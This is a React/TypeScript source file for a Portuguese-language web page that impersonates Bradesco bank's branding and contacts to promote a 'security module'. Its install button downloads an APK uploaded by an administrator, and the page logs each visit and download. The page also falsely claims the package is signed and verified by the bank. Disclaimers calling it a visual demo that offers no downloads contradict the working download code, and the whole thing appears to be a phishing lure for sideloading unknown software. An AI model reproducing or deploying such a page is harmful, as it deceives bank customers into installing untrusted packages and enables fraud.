import { createFileRoute } from "@tanstack/react-router";
import { ShieldCheck, Smartphone, FileText, UserRound, Sun, TriangleAlert, Building2, Download, ChevronUp, Shield, MonitorDown, LayoutDashboard, Phone, Mail, Clock, Linkedin, Youtube, Twitter } from "lucide-react";
import { DemoButton } from "@/components/demo-button";
import redLogo from "@/assets/vermelho-2.png";
import blackLogo from "@/assets/preto-2.png";
import { useEffect, useState } from "react";
import { getApkDownloadUrl } from "@/lib/apk";
import { logAccess, logDownload } from "@/lib/logs";
import { toast } from "sonner";


export const Route = createFileRoute("/")({
  head: () => ({ meta: [
    { title: "Módulo de Segurança — Demonstração visual" },
    { name: "description", content: "Reprodução visual não oficial, sem vínculo com o Bradesco e sem instalação de software." },
    { property: "og:title", content: "Módulo de Segurança — Demonstração visual" },
    { property: "og:description", content: "Modelo visual independente. Não é um canal bancário e não oferece downloads." },
    { property: "og:type", content: "website" },
    { name: "twitter:card", content: "summary_large_image" },
  ] }),
  component: Index,
});

const features = [
  { icon: ShieldCheck, title: "Blindagem em Transações", text: "Monitoramento e resposta contínua a vetores de fraude com telemetria proprietária." },
  { icon: Smartphone, title: "Dispositivo Confiável", text: "Validação criptográfica do aparelho homologado com biometria e token inteligente." },
  { icon: FileText, title: "Conformidade LGPD", text: "Rastreabilidade completa de credenciais e journaling seguro para auditoria regulatória." },
];
const validations = [
  { icon: UserRound, title: "Onboarding guiado", text: "Experiência Pessoa Física e Pessoa Jurídica alinhada ao padrão mobile Bradesco." },
  { icon: Sun, title: "Validação multicanal", text: "Assinatura digital, geocerca e challenge-response sincronizados." },
  { icon: TriangleAlert, title: "Conectividade segura", text: "VPN dedicada com inspeção TLS e telemetria em tempo real." },
  { icon: Building2, title: "Operações PJ", text: "Layout PJ dedicado com política de assinaturas e duplo aprovador." },
];

function Index() {
  const [loading, setLoading] = useState(false);
  useEffect(() => { logAccess().catch(() => {}); }, []);
  const handleInstall = async (e: React.MouseEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const r = await getApkDownloadUrl();
      if (!r) {
        toast.error("APK ainda não disponível. Peça ao administrador para enviar.");
        return;
      }
      logDownload({ data: { filename: r.filename } }).catch(() => {});
      const a = document.createElement("a");
      a.href = r.url;
      a.download = r.filename;
      a.rel = "noopener";
      document.body.appendChild(a);
      a.click();
      a.remove();
      toast.success("Download iniciado.");
    } finally {
      setLoading(false);
    }
  };


  return (
    <main id="inicio" className="reference-page">
      <div className="reference-shell">
        <header className="reference-protection" aria-label="Proteção Digital">
          <img className="protection-logo-image" src={redLogo} alt="Bradesco — logo vermelha" />
          <p className="protection-title">PROTEÇÃO DIGITAL</p>
        </header>
        <section className="reference-hero" aria-labelledby="hero-title">
          <p className="hero-eyebrow"><ShieldCheck size={25} /><span>MÓDULO DE<br />SEGURANÇA</span></p>
          <h1 id="hero-title">Módulo de Segurança Bradesco</h1>
          <p className="hero-lead">Blindagem inteligente para jornadas Pessoa Física e Pessoa Jurídica seguindo o padrão oficial dos apps <strong>Bradesco.</strong></p>
          <p className="hero-description">A versão 5.4 integra autenticação biométrica reforçada, múltiplos fatores contextuais e observabilidade contínua, garantindo decisões rápidas antes que riscos impactem os canais móveis.</p>
          <dl className="hero-details">
            <div><dt>VERSÃO</dt><dd>5.4.12</dd></div>
            <div><dt>ÚLTIMA ATUALIZAÇÃO</dt><dd>07 Oct 2026</dd></div>
            <div><dt>AMBIENTE</dt><dd>• Pessoa Física<br />• Pessoa Jurídica</dd></div>
          </dl>
        </section>
        <section className="reference-features" aria-label="Recursos do modelo">
          {features.map(({icon: Icon, title, text}) => <article className="reference-feature" key={title}><div className="reference-icon"><Icon size={40} strokeWidth={1.6} /></div><h2>{title}</h2><p>{text}</p></article>)}
        </section>
        <section className="reference-install" aria-label="Instalação do módulo">
          <a className="install-button" href="#" onClick={handleInstall} aria-busy={loading}><Download size={24} /><span>{loading ? "PREPARANDO..." : <>INSTALAR<br />MÓDULO DE<br className="mobile-break" /> SEGURANÇA</>}</span></a>
          <p className="reference-caption">PACOTE ASSINADO DIGITALMENTE E VERIFICADO POR BRADESCO DIGITAL.</p>
          <p className="demo-note">Texto da referência. Demonstração visual; assinatura e verificação não comprovadas.</p>
        </section>
        <section className="reference-validation" aria-labelledby="validation-title">
          <h2 id="validation-title">VALIDAÇÃO DO MÓDULO<br />DE SEGURANÇA</h2>
          <div className="validation-grid">{validations.map(({icon: Icon, title, text}) => <article className="reference-validation-item" key={title}><div className="reference-icon"><Icon size={34} strokeWidth={1.6} /></div><h3>{title}</h3><p>{text}</p></article>)}</div>
        </section>
        <aside className="reference-notice"><h2><FileText size={28} /><span>INFORMAÇÕES<br />IMPORTANTES</span></h2><p>Antes de instalar o módulo, confirme o pareamento do dispositivo autorizado, valide a conectividade segura e então acione o download. O assistente acompanha cada etapa e registra o procedimento para auditoria.</p><p className="demo-note">Conteúdo reproduzido apenas como referência visual. Para serviços bancários, utilize exclusivamente os canais oficiais do banco.</p></aside>
        <footer className="reference-footer" aria-label="Rodapé da demonstração">
          <img className="reference-footer-logo" src={blackLogo} alt="Bradesco — logo preta" />
          <p className="reference-footer-desc">Centro de inovação Bradesco dedicado a manter canais digitais resilientes, integrando análise cognitiva e governança segura para Pessoa Física e Pessoa Jurídica.</p>
          <h3>LINKS ESTRATÉGICOS</h3>
          <ul className="reference-footer-list">
            <li><Shield size={22} strokeWidth={1.6} /><span>Diretrizes de segurança</span></li>
            <li><MonitorDown size={22} strokeWidth={1.6} /><span>Central de atualizações</span></li>
            <li><LayoutDashboard size={22} strokeWidth={1.6} /><span>Governança & LGPD</span></li>
          </ul>
          <h3>CANAIS PRIORITÁRIOS</h3>
          <ul className="reference-footer-list">
            <li><Phone size={22} strokeWidth={1.6} /><span>(11) 4004-1225</span></li>
            <li><Mail size={22} strokeWidth={1.6} /><span>seguranca@bradesco.com.br</span></li>
            <li><Clock size={22} strokeWidth={1.6} /><span>Plantão 24h</span></li>
          </ul>
          <hr className="reference-footer-divider" />
          <p className="reference-footer-copy">© 2025 Banco Bradesco S.A. – Unidade de Segurança Digital.</p>
          <div className="reference-footer-social">
            <span><Linkedin size={24} strokeWidth={1.6} /></span>
            <span><Youtube size={24} strokeWidth={1.6} /></span>
            <span><Twitter size={24} strokeWidth={1.6} /></span>
          </div>
          <p className="demo-note">Rodapé reproduzido apenas como referência visual, sem vínculo com o Bradesco. Os canais listados não pertencem a esta demonstração.</p>
        </footer>
      </div>
      <footer className="demo-footer">Demonstração independente · Nenhum serviço bancário disponível</footer>
      <DemoButton className="back-top" aria-label="Voltar ao topo" title="Voltar ao topo" onClick={() => window.scrollTo({top: 0, behavior: "smooth"})}><ChevronUp size={25} /></DemoButton>
    </main>
  );
}